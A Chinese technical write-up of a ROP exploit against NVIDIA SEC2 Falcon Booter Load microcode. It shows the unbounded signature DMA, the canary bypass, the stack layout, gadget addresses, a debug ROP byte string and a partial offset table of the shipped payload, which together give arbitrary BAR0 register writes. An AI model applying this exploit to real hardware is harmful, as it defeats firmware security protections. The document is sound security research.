# 签名缓冲区溢出与 ROP 链

**本页涵盖：** 漏洞利用本身：SEC2 Booter Load 微码中的无界签名 DMA、为什么栈金丝雀挡不住它、溢出落到的精确栈、gadget 词汇表、正式载荷的完整偏移表，以及从中得到的任意 BAR0 写入原语。Falcon、booter 镜像和驱动调用序列的背景见 [SEC2 Falcon 与 Booter Load 微码](falcon-and-booter.md)。该原语用来打开的掩码见 [权限级掩码](privilege-level-masks.md)。

**三句话版关键结论。** Booter 用一个从主机提供字段逐字取来的长度、没有任何形式的边界检查把 GSP 签名复制进 DMEM，因此把该字段设为 `0xF800` 会用攻击者选择的字节填满 DMEM `0x0800`..`0xFFFF`，包括栈金丝雀防护全局、每个保存的金丝雀副本和每个保存的返回地址。因为 Falcon 是哈佛架构，溢出写不到指令内存，所以得到的不是代码注入，而是对厂商自己签名微码的返回导向编程。正式驱动用它**每次 Booter Load 触发恰好执行一次任意 BAR0 寄存器写入**，并为自己想碰的每个寄存器重新触发一次 booter。

---

## 1. 漏洞

被利用的缺陷是 Booter Load 的 LS 签名验证中的无界 DMA。IMEM `0x29C4` 处的 `booterVerifyLsSignatures_TU10X` 执行 `lcall 0x0601`（`booterIssueDma_HAL`），DMEM 目标固定，长度直接取自 `WprMeta.sizeOfSignature`。目标由 IMEM `0x37ad` 处的 `mov $r10 0x800` 设置，传输经过 IMEM `0x4d4` 的 `dma_copy_block`，在 IMEM `0x37b3` 调用。

| 字段 | 由谁控制 | 有界？ |
|---|---|---|
| 缓冲区内容 | 主机驱动（`pSignatureMemdesc`） | 不适用 |
| `WprMeta.sizeOfSignature` | 主机驱动 | **没有任何检查** |
| DMEM 目标 | 固定 `0x0800` | 固定 |

算术是精确的，也是整个漏洞利用：

```text
DMA destination  = DMEM 0x0800
shipping length  = 0xF800  (63,488 bytes)
0x0800 + 0xF800  = 0x10000 = the top of DMEM
```

> [!NOTE]
> **本页最重要的换算**
>
> **DMEM 地址 = 载荷偏移 + `0x800`。** 等价地，载荷偏移 = DMEM 地址减 `0x800`。载荷偏移 `0xf754` **就是** DMEM `0xFF54`。载荷偏移 `0x5b40` **就是** DMEM `0x6340`。引用 `0xF7xx` 偏移的文档和引用 `0xFFxx` DMEM 地址的文档描述的是同一批字节、不同单位，而不是两个不同的 booter 构建。一份把这种差异读作分叉证据的出处审查是错的。

两个独立的内部交叉检查确认了基址。第一，正式载荷在偏移 `0x5b40` 写假金丝雀，而 `0x5b40 + 0x800 = 0x6340`，即独立确定的防护全局。第二，偏移 `0x1100` 映射到 DMEM `0x1900`，即已记录的 `f100` 字段保存槽。报告中的"最高尾槽 63448（DMEM `0xFFD8`）"和"SP 在 `0xFF3C`，载荷偏移 63292"在同一映射下精确重现。

> [!CAUTION]
> **溢出不提供代码执行**
>
> 指令在 IMEM、数据在 DMEM，处于两个独立的 16 位地址空间。签名 DMA 只落在 DMEM。攻击者控制的是 Falcon 调用栈上的一组返回地址，因此执行的每条指令都是已签名、已认证 `booter_load` 镜像的片段。任何时刻都没有非签名代码运行。早先的"覆盖 IMEM"模型已于 2026-06-30 修正。

因为破坏发生在镜像通过自身验证*之后*，易受攻击的 booter 无法通过驱动更新撤销：NVIDIA 签名并发布了该 blob，验证密钥被熔断进硅片和不可变启动 ROM。对不可撤销主张的置信度为中等：关于不可变信任根的推理是健全且无人质疑的，但从未针对加固驱动做过经验证明。

### 1.1 为什么复制长度不会在后面被抓住

从溢出的 `0x4d4` 帧返回到 `0x37b7` 会重新加入 booter 真实的镜像验证（`0x2e80` 的 `image_auth_decrypt`，AES 加 MAC，使用 `r2`..`r7` 中的 WprMeta 值）。那里的长度检查自然通过，因为复制字节数（`0xF800`）等于 `WprMeta.sizeOfSignature`（`0xF800`）。超大的签名是自洽的。

### 1.2 实测悬崖

机械越界阈值是防护减缓冲区：`0x6340 - 0x800 = 0x5b40`。

| 签名大小 | 越界终点 | 防护 | 结果 |
|---|---|---|---|
| `0x5b00` | DMEM `0x6300` | 完好 | 卡启动。MB0 = `0x96`。 |
| `0x5b40` | DMEM `0x6340` | 恰好到达 | 实测 panic 边界。 |
| `0x5c00` | DMEM `0x6400` | 被砸 | 中止。MB0 = `0x47`。 |
| `0xF800` | DMEM `0x10000` | 被砸，并被替换 | 漏洞利用。 |

`0x5B40` 边界是通过在真实硬件上对载荷大小做二分搜索找到的，`0x6340 - 0x5B40 = 0x800` 就是 DMA 基址最初的推导方式。论文的 Falcon 仿真器把同一阈值夹在中间，并称其与硬件长度扫描一致。

16 KB"溢出悬崖"由金丝雀全局位于 DMEM 那个位置造成，不是 booter 中的任何大小检查。完全没有长度验证：booter 接受一切，一旦写入越过 DMEM `0x6340`，随机防护被摧毁，每个返回函数都 panic。因为 DMEM 是 16 位空间，在到达栈尾之前几乎可以写入 64 KB。

### 1.3 论文的仿真器追踪

2026 年 6 月预印本发布了同一 booter 的 Falcon 仿真器追踪：

```text
REACHED SIG DMA: buffer=0x800 size=0xf800 overrun-end=0x10000 guard@0x6340

(A) naive non-uniform signature, length 0xf800:
    SIGSZ=0xf800 pc=0x7def spin=0x7def CANARY=True  MB0=0x47   <- stack-check-fail abort
(B) uniform fill with V = 0x4a7:
    SIGSZ=0xf800 pc=0x4a7  spin=0x4a7  CANARY=False MB0=0x31   <- canary passed, PC hijacked to V
```

`0x4a7` 和 `0xf800` 都逐字作为常量出现在正式内核补丁中。

---

## 2. 击破栈金丝雀

### 2.1 防护

Booter Load 中每个函数都有金丝雀保护。`_start` 阶段 9 在 DMEM `0x6340` 安装一个新的高熵防护字，取自 SCP 自供给后扫描 DMEM `0x6330`..`0x6340` 时找到的第一个非零字。每个受保护函数在进入时把它复制进自己的帧、退出时比较，不匹配就调用 IMEM `0x7dd9` 的 `__stack_chk_fail`。从真实 8 GB 卡观察到的活金丝雀：DMEM `0xff94` 处 `0xcbee9c9f`、`0xffc4` 处 `0x3be0f4ab`、`0xfff4` 处 `0x941b798d`。三者各不相同，且每次启动都是随机。

完整的 `__stack_chk_fail`：

```asm
7dd9:  mov  $r15 0x6340
       ld b32 $r15 D[$r15]
       add  $sp -0x4
       mov  $r9 $sp
       st b32 D[$r9] $r15
       mov  $r15 0x47
       mov  $r9 0x1000        ; CSB MAILBOX0
       iowrs I[$r9] $r15
7def:  lbra 0x7def            ; spin forever
```

跳转到 `0x7de9` 而不是 `0x7dd9` 会把 `$r15` 中的任何内容打印到邮箱，这是项目期间构建的每个调试 ROP 的基础。

### 2.2 为什么它挡不住

防护全局位于可写数据内存中，正处在它要检测的同一溢出可达范围内。

> [!NOTE]
> **靠统一性击破，而不是靠预测**
>
> 载荷用同一个值 `V` 同时覆盖 DMEM `0x6340` 的防护全局**和**栈上每个保存金丝雀槽。于是每次尾声都计算 `V == V`，通过，并返回到链中。这个值任意；保密性和熵都无关紧要。每次启动用硬件 RNG 重新播种防护提供零保护，因为对手永远不需要得知它。

没有 RELRO 等价物、没有防护页、也没有 MPU 只读映射。论文仿真器中种子看起来像固定常量，只是因为密码学协处理器被桩掉了。

### 2.3 用哪个值

> [!CAUTION]
> **正式防护值是 `0xc0deca7e`。不是 `0xFACEB13D`。**
>
> `0xc0deca7e` 在正式载荷中恰好出现五次，位于载荷偏移 `0x5b40`、`0xf758`、`0xf794`、`0xf7a0` 和 `0xf7c4`（DMEM `0x6340`、`0xFF58`、`0xFF94`、`0xFFA0`、`0xFFC4`）。字符串 `FACEB13D` 在正式树或 12 个存档分支中的任何地方**都不出现**。任何把 `0xFACEB13D` 当作"那个"金丝雀值的文档，描述的都是净室研究链，而不是发布的解锁器。

| 值 | 在哪里正确 |
|---|---|
| `0xc0deca7e` | 正式 `cmpunlocker` 驱动，master 和全部 12 个分支，逐字节相同 |
| `0xFACEB13D` | 净室研究载荷和无驱动工具，2026-07-04 采用的约定 |
| 防护地址 `0x6340` | **两者。** 这是承重事实。 |

`0xFACEB13D`（"fake bird"）是在 `0xDEADC0DE` 和 `0xCAFEBABE` 被否决后采用的约定，因为后者被过度使用、可能出现在 NVIDIA 自己的代码里，会让 DMEM 转储难以阅读。因为机制与值无关，两个标记都有效。

金丝雀副本槽在两系之间也不同：研究链用 DMEM `0xFF58`、`0xFF94`、`0xFFDC`、`0xFFF4`；正式链用 `0xFF58`、`0xFF94`、`0xFFA0`、`0xFFC4`。

### 2.4 指针别名替代方案

`0x10b9` 多写链用了完全不同的技巧：把常量 `0x6340` 作为*指针*喂给两个操作数槽，使比较加载两次 `D[0x6340]` 并与自身比较。Gadget `0x1fb9` 是 `ld b32 $r15 D[$r1]; ld b32 $r9 D[$r2]; mov b32 $r11 $r10; mov b32 $r10 $r0; cmp b32 $r15 $r9; bra e 0x1fca`，因此 `r1 = r2 = 0x6340` 时比较平凡相等，防护值为 0 也可以。正式驱动改回植入匹配的字。

### 2.5 填充 dword

`0xF800` 缓冲区的每个 dword 首先被写成 `SEC2_POSTBL_TIMING_FILL_DWORD = 0x000004a7U`（15,872 个 dword），然后才覆盖特定槽。`0x4a7` 不是任意的：IMEM `0x000004a7` 是一个自循环。

```asm
000004a7:  3e a7 04 00    B lbra 0x4a7
```

如果被劫持的 PC 落到任何非预期位置，Falcon 会停在一个可观察的重型安全自循环中，而不是游荡进故障。它是诊断性的，不是功能要求，但正式驱动正是为此保留它。

---

## 3. 溢出落到的栈

溢出发生时 booter 已经六帧深。这个布局是通过 35 次启动从 8 GB 卡逐字渗出真实栈重建的，并独立地从反汇编推导。纯手工重建曾经失败，因为 `0x4d4` 的 `dma_copy_block` 至少从 20 个地方被调用。

| DMEM | 内容 | 帧 |
|---|---|---|
| `0xFF3C` | 溢出时 SP；保存的 r6 = `sizeOfRadix3Elf` | `0x4d4 dma_copy_block` |
| `0xFF40` | 保存的 r5 = `gspFwWprStart[63:32]` | |
| `0xFF44` | 保存的 r4 = `bootBinOffset[31:0]` | |
| `0xFF48` | 保存的 r3 = `sizeOfBootloader` | |
| `0xFF4C` | 保存的 r2 = `gspFwWprStart[31:0]` | |
| `0xFF50` | 保存的 r1（设为 `0x600`，即 WprMeta 指针） | |
| `0xFF54` | 保存的 r0 | `mpopaddret $r6` 弹出块末尾 |
| `0xFF58` | 金丝雀副本（SP + `0x1c`） | |
| **`0xFF5C`** | **返回地址。ROP 入口点。** 原厂值 `0x37b7`。 | |
| `0xFF60`-`0xFF90` | 帧主体，保存的 r2-r7 = WprMeta FB 地址 | `0x3747 image_copy_verify` |
| `0xFF94` | 金丝雀 | |
| `0xFF98` | 返回地址 `0x2740` | |
| `0xFF9C`-`0xFFD0` | 帧主体（`$sp = 0xFF9C`） | `0x22ba booter_load_wpr_main` |
| `0xFFC4` | 金丝雀 | |
| `0xFFD4` | 返回地址 `0x814e` | |
| `0xFFD8` / `0xFFDC` | wrap 帧主体 | `0x8137 booter_load_wrap` |
| `0xFFE0` | 返回地址 `0x80d7` | |
| `0xFFE4`-`0xFFFC` | `main` 的帧 | `0x7f82 main` |
| `0xFFEC` | finalize 局部 `D[sp+8]`，原厂值 `0x1` | 喂给 `0x001180f8[31:28]` |
| `0xFFF0` | `D[sp+0xc]`，原厂 `0x0c000000` | |
| `0xFFF4` | `main` 的金丝雀 | |
| `0xFFF8` | 返回地址 `0x4d0`（`_start` 出口） | |

从真实硅片渗出的 580 booter 实测原始栈：

```text
0xff74=0x0        0xff78=0x0        0xff7c=0x0        0xff80=0x8
0xff84=0x600      0xff88=0x0        0xff8c=0x600      0xff90=0x0
0xff94=0xcbee9c9f 0xff98=0x2740     0xff9c=0xfff00000 0xffa0=0x1
0xffa4=0x8        0xffa8=0x8        0xffac-0xffc0=0x0 0xffc4=0x3be0f4ab
0xffc8=0x8700     0xffcc=0xb99e21e  0xffd0=0xd6a262d  0xffd4=0x814e
0xffd8=0xf4bbdeaa 0xffdc=0x98cf4f20 0xffe0=0x80d7     0xffe4=0x0
0xffe8=0x81664b1d 0xffec=0x1        0xfff0=0xc000000  0xfff4=0x941b798d
0xfff8=0x4d0      0xfffc=0x0
(partial, lower: FF60=0x1, FF64=0x520)
```

该转储作者陈述了两个注意事项：`0xffd8` 实际是保存的 r0，所以那里的"金丝雀"标签是错的；`FF68`/`FF70` 无法恢复，因为渗出 ROP 本身占据这些槽。

### 3.1 证明入口点

被劫持的返回地址通过一次邮箱受控实验证明：用通常产生 MB0 = `0x31` 的大过填，把载荷字节 63324-63327 换成 `panic()` 地址会把邮箱变成 `0x47`。偏移 63324 = `0xF75C`，而 `0xF75C + 0x800 = 0xFF5C`。

### 3.2 每次启动必须修补的五个字

五个栈字保存着溢出摧毁、且恢复路径上没有任何东西重新推导的活 `WprMeta` 值。

| DMEM | 寄存器 | WprMeta 字段 | 载荷偏移 |
|---|---|---|---|
| `0xFF3C` | r6 | `sizeOfRadix3Elf` | 63292 |
| `0xFF40` | r5 | `gspFwWprStart[63:32]` | 63296 |
| `0xFF44` | r4 | `bootBinOffset[31:0]` | 63300 |
| `0xFF48` | r3 | `sizeOfBootloader` | 63304 |
| `0xFF4C` | r2 | `gspFwWprStart[31:0]` | 63308 |

r7 中的 `gspFwOffset` 自动保留，不注入。真实值在 IMEM `0x3768`-`0x3777` 计算（例如 `ld $r2 D[$r10+0x70]`、`ld $r6 D[$r10+0x18]`），由 `0x4d7` 的 `mpush $r6` 溢出、由 `0x5ff` 的 `mpopaddret $r6` 恢复。因为 RM 每次启动都把 WPR2 重新分配到新的 FB 地址（一次运行 `0x277700000`，而陈旧烘入的是 `0x1_f7700000`），静态捕获不能复用。

DMEM `0x600` 的 `WprMeta` 结构本身永远不会被覆盖，因为它结束于 `0x700`，在 `0x800` DMA 目标之下，而且恢复路径确实重新读它：`0xFF50` 的弹出槽设为 `0x600`，返回后 `0x37b7` 立即做 `ld $r9 D[$r1+0x50]`。只有 r2-r6 是无法重新推导的帧恢复副本。

> [!NOTE]
> **开放问题：WprMeta 溢出的寄存器分配**
>
> 三个来源中的两个给出 `0xFF3C` = 保存的 r6 = `sizeOfRadix3Elf 0x01d09ea0`、`0xFF4C` = 保存的 r2 = `gspFwWprStart 0xf7700000`。第三个给出相反的并自相矛盾。上面采用多数读数。通过重读 `0x22ba` 前导中的弹出顺序定案。

---

## 4. Falcon 栈机制

搞错这些会静默杀死链条，通常死在 `__stack_chk_fail`。

- **`mpush $rN` 先以最高地址压 r0**，向下到 rN 最后压到 SP 指向的最低地址。`mpop` / `mpopaddret` 是严格 LIFO：rN 先从最低槽出，r0 最后从最高槽出。要在块顶字地址为 T 的块中为 rK 植入值，写在 `T - 4*K`。
- **`mpopaddret $rN imm`** 恢复 `$r0` 直到 `$rN`，立即数保留通常保存栈金丝雀的额外字节，返回地址在其上。SP 总前进量为 `(N+1)*4 + imm + 4`：`$r6 0x4` 形式前进 `0x24`（9 个 dword：r0-r6、一个保留 dword、返回地址），结束 `0x10aa` 的 `$r3 0x4` 形式前进 `0x18`，`$r2 0x4` 形式前进 `0x14`（5 个 dword）。正式载荷修正了全部三个：`0x4d4` 尾声让 SP 停在 `0xFF60`，`0x0cc8` 的 `$r3` 尾声从 `0xFF74`（`0x00001fbd`）取返回地址，`0x1fca` 的 `$r2` 尾声从 `0xFF88`（`0x000010aa`）取返回地址。硅片 `0x47` 邮箱探测记录的 `0x20` 和 `0x10` 数字计入了寄存器块加立即数，但停在返回地址弹出之前。envytools 对 `mpopaddret` 完全没有文档条目，只有 `ret`。
- **栈指针只能前进，不能回卷。** 每个函数尾 `ret` 或 `mpopaddret` 都递增它，从 `$sp+4` 到 `$sp+40` 每个增量都有对应的一条。裸 `ret` 把 `$sp` 递增 4。**booter 中不存在降低 SP 的 gadget**：`mov $sp $r9` 只出现在 `_start`（它重跑启动）中，所有 `mpush` / `add $sp -N` 形式都在函数前导内。
- **Booter 在入口清除 r0-r16**，因此链条必须单次加载内建立自己所有的寄存器状态。置信度：中等；与可工作链设计一致，但从未单独确认。
- **`r0`-`r8` 可栈弹出；`r9`-`r15` 不行。** `mpopaddret $rN` 从不超过 N = 8。这是迫使 elevator gadget 存在的约束，因为写引擎在 `r10`/`r11` 中取参数。

来自机器生成 gadget 图谱的 setter 计数（mov / ld / zero），通过对 `booter_load_ga100_dbg_seccode.fuc5.asm` 做过程间可达性分析构建，只有当目标寄存器在 `ret` 时仍持有所设值才列出 gadget：

| 寄存器 | mov | ld | zero | | 寄存器 | mov | ld | zero |
|---|---|---|---|---|---|---|---|---|
| r0 | 78 | 2 | 3 | | r8 | 3 | 0 | 2 |
| r1 | 23 | 3 | 5 | | r9 | **0** | 131 | 0 |
| r2 | 25 | 4 | 2 | | r10 | 48 | - | 28 |
| r3 | 17 | 6 | 0 | | r11 | 6 | 3 | 9 |
| r4 | 15 | 4 | 2 | | r12 | 7 | 11 | 2 |
| r5 | 10 | 5 | 2 | | r13 | 10 | 6 | 5 |
| r6 | 3 | 5 | 1 | | r14 | 18 | 10 | 22 |
| r7 | 2 | 3 | 0 | | r15 | **0** | 131 | 0 |

几乎每条 gadget 路径都运行需要 `r15 == r9` 的金丝雀比较。图谱记录三类前置条件：`canary(r15==r9)`、`via-call`（路径执行一个已证实不会破坏目标但需要自身状态的真实子函数）和 `data-branch`（路径上有一个对寄存器值的条件分支）。可达性分析保证寄存器被*保留*，不保证任意值可达：`derefs-r11` 意味着 r11 被用作指针，必须是有效的可写 DMEM 地址。只有少数 gadget 完全没有前置条件，例如 `0x19bc`（`$r3 <- $r12`，终结符 `ret`）。

从二进制提取的多弹出入口点：

| 弹出到 | 地址（部分） |
|---|---|
| `$r0` | `0x1ba0`、`0x1c0b`、`0x1cde`、`0x1d9f`、`0x202d`、`0x2089`，另有 10 个 |
| `$r1` | `0x0bc6`、`0x0c79`、`0x1061`、`0x1218`、`0x1443`、`0x1547`，另有 18 个 |
| `$r2` | `0x09d7`、`0x0b25`、`0x0ef0`、`0x0f88`、`0x12e7`、`0x1fca`，另有 6 个 |
| `$r3` | `0x0b99`、`0x0cc8`、`0x0f36`、`0x10ff`、`0x13a4`、`0x21f1`，另有 7 个 |
| `$r4` | `0x08fe`、`0x0a9e`、`0x2a62`、`0x3b53`、`0x4765`、`0x7c62`，另有 1 个 |
| `$r5` | `0x0d63`、`0x0e49`、`0x1b41`、`0x29b5`、`0x7a61`、`0x85ce`，另有 1 个 |
| `$r6` | `0x05ff`、`0x07d9`、`0x28a9`、`0x4674`、`0x60c5` |
| `$r7` | `0x38c3`、`0x7977`、`0x84cd` |
| `$r8` | `0x071a`、`0x22b7`、`0x3743`、`0x3c8c`、`0x4484`、`0x5ccb`，另有 2 个 |

还有一个已测试确认的机械属性：**ROP 栈可以合法越过 DMEM `0xFFFF` 并回卷到 `0x0000`**，因此链长不受 DMEM 顶部限制。它没有修复当初提议要解决的 `0x65` 错误。后来一份竞争分析认为，当几何写入移动栈时，被推到 `0xFFFF` 之外的 finalize 局部"回卷并变得不可控"。两者对不同的槽可能都成立；没有人陈述边界，因此把回卷视为可用于扩展链条、但不可用于 `main` 必须回读的值。

---

## 5. 任意 BAR0 写入原语

### 5.1 引擎

IMEM `0x10aa` 的 `reg_write_indirect` 就是整个原语。它的开源驱动符号是 `_acrlibBar0RegWrite_TU10X`，与 Turing acrlib 中 `0xd10` 的该例程**逐字节相同**：并排编码一致（`f4 30 fc / f9 32 / 83 40 .. 00 / bf 39 / b2 a0 / b2 b1 / fe 42 01 / 90 22 10 / a0 29 / …`），只在金丝雀 DMEM 地址（GA100 是 `0x6340`，TU10X 是 `0x940`）和调用目标上不同。以这种方式识别它就是原语的发现方式。

它按顺序做：

1. 把金丝雀从 `D[0x6340]` 载入 `$r9`（`mov $r3 0x6340`、`ld b32 $r9 D[$r3]`）。
2. `0x10b5` / `0x10b7`：`mov b32 $r0 $r10`、`mov b32 $r1 $r11`（搬运参数）。
3. 从 `0x10b9`：把金丝雀保存到栈（`mov $r2 $sp`、`add $r2 0x10`、`st D[$r2] $r9`），然后用 `lcall 0x1064`（`mailbox_wait_ready`）获取邮箱互斥锁。
4. `csb_write(I[0x1c100] = 地址)`、`csb_write(I[0x1c200] = 值)`、`csb_write(I[0x1c000] = 0x800000f2)`，全部经 `0x8224` 的 `csb_write`。
5. 回读 `0x1c000`，再次等待 ready。
6. 把保存的金丝雀与 `D[0x6340]` 对照验证。
7. 经 `0x10ff` 的 `mpopaddret $r3 0x4` 返回。

`0x1064` 的 `mailbox_wait_ready` 轮询 `I[0x1c000]` 位 [14:12]：0 = 完成，1 = 继续自旋，其他 = 错误 `0x15` 后退出。读对应物是 `0x1196` 的 `reg_read_indirect`，命令字 `0x800000f1`。

### 5.2 两个入口点，两套寄存器约定

这调和了源材料中一个长期存在的表面矛盾。

| 入口 | 参数 | 谁在用 |
|---|---|---|
| `0x10aa`（完整） | `r10` = 目标 BAR0 地址，`r11` = 值 | **正式驱动。** |
| `0x10b9`（中途） | `r0` = 地址，`r1` = 值 | 无驱动 `refire_chain*.py` 工具。 |

从 `0x10b9` 进入跳过 `0x10b5`/`0x10b7` 的 `mov r0,r10` / `mov r1,r11` 复制，因此 ROP 可以直接从栈供给操作数。两者到达同一个 `iowrs I[0x1c…]` 存储。源材料中的两种描述对各自的入口点都正确。

> [!CAUTION]
> **正式载荷用 `0x000010aa`，不是 `0x10b9`**
>
> 值 `0x000010aa` 写在 `driver/patches/0001-sec2-postbl-plm-ss-cfg.patch` 的载荷偏移 `0xf788`（DMEM `0xFF88`），字符串 `10b9` 在正式树或 12 个分支的任何地方**都不出现**。任何声称"`0x10b9` 被每个可用载荷使用，包括编译进正式驱动补丁的那个"的说法是自相矛盾的，在此更正。`0x10b9` 自链只是净室和无驱动工具构造。

### 5.3 成本

| 路径 | 每次写入的栈 | 备注 |
|---|---|---|
| `0x10aa` 完整入口 | 主 SP 位移 `+0x10` | 正式。需要 elevator 加载 r10/r11。 |
| `0x10b9` 中途入口 | `+0x18` = 每写 24 字节 | 经 `mpopaddret $r3 0x4` 尾声自链。帧形状 `[r0=金丝雀地址][r1=0][r2=值][r3=地址][金丝雀][RA]`。 |
| `0x8224` 直接 `csb_write` | 每写约 `0x60` 字节 | 可用，但每个寄存器都要手工摆地址、数据、命令和轮询。帧更多，无收益。 |

`+0x10` 对比 `+0x18` 的数字来自 2026-07-06 分析，置信度为中等。

`csb_write` 本身是可用的直接写 gadget，值得读，因为它也展示了失败关闭惯用法：

```asm
8224:  add $sp -0x4
8228:  ld b32 $r15 D[$r15]
822a:  add $sp -0x4
822d:  mov $r9 $sp
8230:  st b32 D[$r9] $r15
8232:  iowrs I[$r10] $r11        ; writes to Falcon I/O, NOT external BAR0
8235:  mov $r9 0x9100
8239:  iords $r9 I[$r9]
823c:  shr b32 $r9 0x1f
823f:  bra b32 $r9 0x1 ne 0x824b
8243:  mov $r10 0x15
8245:  lcall 0x1d0f
8249:  exit
```

从链中调用 `0x8224` 的正确 elevator gadget 是 `0x1fb9` 和 `0x1fbd`。

### 5.4 首次演示

从 HS ROP 链做任意 BAR0 寄存器写入于 2026-07-03 在真实 8 GB 硅片上首次演示：寄存器 `0x0014a0` 从 `0x00000000` 变为 `0xcafebabe`，邮箱读 `0x47`，因为链故意以 `panic()` 终止。第二位研究者独立报告了向任意 I/O 地址写任意字节，通过写 `0x1000` 并在邮箱中观察来验证。

> [!WARNING]
> **回读不是免费的**
>
> PL0 的主机无法回读许多这些寄存器，返回 `0xbadf5040` / `0xbadf50xx`。这是权限阻止读的指示，**不是**存储的毒值。验证 HS 写入的回读需要 Falcon 内的读 gadget `0x1196` 或主机可见的邮箱别名。相关 PLM 打开后，主机可以正常读，这正是正式驱动依赖的。

### 5.5 原语能到达哪些寄存器

确认可工作：FEAT PLM `0x00823804`；WPR2 `0x001FA824`；正式驱动中还有 WPR_CFG `0x001fa7cc` 打开到部分值 `0xfffff0ff`、FBPA `0x009a0148` 和 WPR `0x001fa7c4`。

> [!NOTE]
> **开放问题：相邻 WPR 寄存器上报的失败**
>
> 一份单一来源的清单报告，测试时对 WPR1_HI `0x001FA820`、WPR1_LO `0x001FA81C` 和 WPR_Mask `0x001FA7CC` 的写入被确认*不*工作，但正式驱动通过同一原语成功打开 `0x001fa7cc`。要么早期测试用了不同的值或不同的链，要么部分打开 `0xfffff0ff` 成功而完整 `0xffffffff` 打开失败。对失败清单的置信度：中等。通过一次尝试 `0x001fa7cc = 0xffffffff` 并回读的触发，连同早期测试的精确载荷，可以定案。

还有一个独立于原语的真正结构限制：SEC2 ROP 只能打开 `SOURCE_ENABLE` 字段白名单 sec2-HS 的 PLM。`0x00823b00` 被观察到因该原因拒绝链条。见 [权限级掩码](privilege-level-masks.md)。

---

## 6. Gadget 词汇表

下面每个地址都是 **IMEM**，每个都是同一个签名 `booter_load` 镜像的片段。

| IMEM | 是什么 | 在链中的作用 |
|---|---|---|
| `0x04a7` | `lbra 0x4a7` 自循环 | 填充 dword；保持 HS 的自旋停靠 |
| `0x04d0` | `_start` 出口 | 终结符 |
| `0x04d4` | `dma_copy_block` | 溢出的帧；`0x5ff` 处尾声 `mpopaddret $r6` |
| `0x0cbd` | `regblock_read_guarded (0x0c7c)` 内的 `mov $r10 $r0` | Elevator |
| `0x0ccb` | `regtable_rw_indexed`，以 `mpopaddret $r5 0x8` 结束 | 也可读作与 `0xd66` 获取配对的 ACR 互斥锁释放 |
| `0x10aa` | `reg_write_indirect` 完整入口 | **写入**（r10 = 地址，r11 = 值） |
| `0x10b9` | 中途入口 | 自链写入（r0 = 地址，r1 = 值） |
| `0x10ff` | `mpopaddret $r3 0x4` | `0x10aa` 的尾声；使写入自链 |
| `0x1b41` | `mpopaddret $r5 0x4` | |
| `0x1b44` | `set_1180f8_bit24()` | 弹出四个字；可重入链中的免互斥锁 gadget |
| `0x1c0e` | `set_1180f8_top_nibble()` | Finalize；经 `0xccb` 调用释放 ACR 互斥锁 |
| `0x1d9f` | `mpopaddret $r0 0x4` | 栈吞噬器 |
| `0x1fb9` | `ld $r15 D[$r1]; ld $r9 D[$r2]; mov $r11 $r10; mov $r10 $r0` | Elevator + 金丝雀别名 |
| `0x1fbd` | `read_820344_820348 (0x1f92)` 内的 `mov $r11 $r10; mov $r10 $r0` | **Elevator。** 正式载荷中使用 3 次。 |
| `0x1fca` | 弹出 `$r0,$r1,$r2` | Elevator 供给 |
| `0x22ba` | `booter_load_wpr_main` | Rejoin |
| `0x27fa` | `0x22ba` 内的 rejoin 点 | 见死路 |
| `0x28a9` | `mpopaddret $r6 0xc` | |
| `0x2d5a` / `0x2d75` | memcpy 蹦床（`$r12 = 0x10`、`lcall 0xe85`） | DMEM 渗出 |
| `0x582d` | `pka_ready_check (0x580f)` 内：把 `$r0 -> $r12`、调用 `regblock_read_guarded` | 尾 |
| `0x7de9` | `__stack_chk_fail` 内 | 把 `$r15` 打印到 MAILBOX0。每个调试 ROP。 |
| `0x7dd9` | `__stack_chk_fail` 入口 | 写 `0x47`，挂起 |
| `0x7e76` | `secure_teardown` | 从不返回；它之后不能追加任何东西 |
| `0x7f2f` | `secure_teardown` 内的退出 gadget | **正式终结符** |
| `0x810d` / `0x8119` / `0x8137` | `main` / `booter_load_wrap` 中的点 | Rejoin |
| `0x814e` | 返回到 `booter_load_wrap` | 轻 rejoin |
| `0x815a` | 金丝雀检查尾 / 栈吞噬器 | 正式载荷中使用 2 次 |
| `0x8224` | `csb_write` | 直接 Falcon-I/O 写入 |
| `0x8262` | 裸 `ret` | 对齐填充 |
| `0x8e18` | clean-tail 展开 gadget | |
| `0xffbc` | 中间展开 gadget | |

> [!NOTE]
> **开放问题：正式尾的若干字实际做什么**
>
> `0x00000cbd`（两次）、`0x00008e18`、`0x0000ffbc`、`0x0000582d`、DMEM `0xFFD8` 处的 `0x00000003` 和两个 `0x0000815a` 条目没有已发布的 gadget 注释。仅就地址范围而言，`0x0000ffbc` 和可能还有 `0x00008e18` 看起来像 DMEM 指针操作数而不是 IMEM 代码地址，因为 booter 镜像跑到约 `0x8200`；这是推断，未经证实。另外无法解释的：DMEM `0x1900` 处 `0x00000007` 在 resetPLM 效果之外的作用，以及填充 dword `0x000004a7`。下一步：在这些地址上运行现有 `register_gadget_atlas.md` 生成器，因为 atlas 格式已经记录前置条件和终结符。对带注释清单过一遍应该能解决全部。

一个在硅片上确认可工作的最小调试 ROP，把 DMEM `0x800`-`0x804` 打印到邮箱然后挂起（gadget `0x0bc6`、`0x0bb9`、`0x7de9`）：

```text
c6 0b 00 00  00 08 00 00  00 08 00 00  55 55 55 55
b9 0b 00 00  55 55 55 55  55 55 55 55  55 55 55 55
e9 7d 00 00
```

放在载荷偏移 **63324**；金丝雀必须在 **23360** 和 **63320** 处理。`0x55555555` 是可区分的填充，不是假金丝雀。

---

## 7. 正式载荷，逐字节

由 `driver/patches/0001-sec2-postbl-plm-ss-cfg.patch` 中的 `_kgspSec2PostblTimingFillPayload()` 生成。缓冲区每个 dword 先设为 `0x000004a7`，然后用 `_kgspSec2PostblTimingPutU32()` 植入 **24** 个 dword。

| 载荷偏移 | DMEM | 值 | 作用 |
|---|---|---|---|
| 全部 | `0x0800`-`0xFFFF` | `0x000004a7` | 填充 / 自旋停靠 |
| `0x1100` | `0x1900` | `0x00000007` | `f100_field_save_restore` 门控；让 resetPLM 保持 `0xff` |
| `0x5b40` | `0x6340` | `0xc0deca7e` | **防护全局本身** |
| `0xf754` | `0xFF54` | *writeValue* | BAR0 写数据参数 |
| `0xf758` | `0xFF58` | `0xc0deca7e` | 帧金丝雀 |
| `0xf75c` | `0xFF5C` | `0x00000cbd` | **第一个返回地址**（elevator） |
| `0xf76c` | `0xFF6C` | *writeAddr* | BAR0 写地址参数 |
| `0xf774` | `0xFF74` | `0x00001fbd` | elevator |
| `0xf780` | `0xFF80` | `0x00000000` | |
| `0xf788` | `0xFF88` | `0x000010aa` | **写 gadget** |
